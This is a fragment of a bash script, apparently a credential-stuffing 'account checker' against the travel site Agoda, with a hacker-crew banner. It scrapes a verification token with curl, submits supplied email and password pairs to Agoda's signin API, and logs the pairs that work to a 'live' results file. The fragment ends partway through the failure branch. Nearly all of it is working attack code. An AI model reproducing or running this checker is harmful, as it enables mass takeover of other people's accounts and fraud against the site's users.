...
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GRN	#\n"
printf "   $WHI ------------------------------------------------------------ \n"
printf "   $YELLOW		      AGODA ACCOUNT CHECKER				\n"
printf "\n"
printf "   $YELLOW		   	  AlchaDecode|STUCK-CREW-				\n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"
...
check(){
header="`date +%H:%M:%S`"
getc=$(curl -s -c s_cookie.tmp 'https://www.agoda.com/' -H 'authority: www.agoda.com' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' --compressed);
token=$(echo $getc | grep -Po '(?<=name="requestVerificationToken" type="hidden" value=")[^"]*');
login=$(curl -s -b s_cookie.tmp 'https://www.agoda.com/api/login/signin' -H 'origin: https://www.agoda.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' -H 'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'content-type: application/json; charset=UTF-8' -H 'accept: */*' -H 'referer: https://www.agoda.com/' -H 'authority: www.agoda.com' -H 'x-requested-with: XMLHttpRequest' --data-binary '{"email":"'$1'","password":"'$2'","pageType":"newhome","pageTypeId":1,"captcha":false,"captchaResponse":null,"languageId":1,"token":"'$token'"}' --compressed);
printf $login;
if [ "$login" == '{"status":0}' ];then
hasil="[ LIVE ] [ ./STUCK-CREW]";
printf "$GRN $hasil $header \n";
echo "$1|$2 - $hasil - $login" >> $3/ResultAgodaLive.txt
else
hasil="[ DIE ] [ ./STUCK-CREW]";
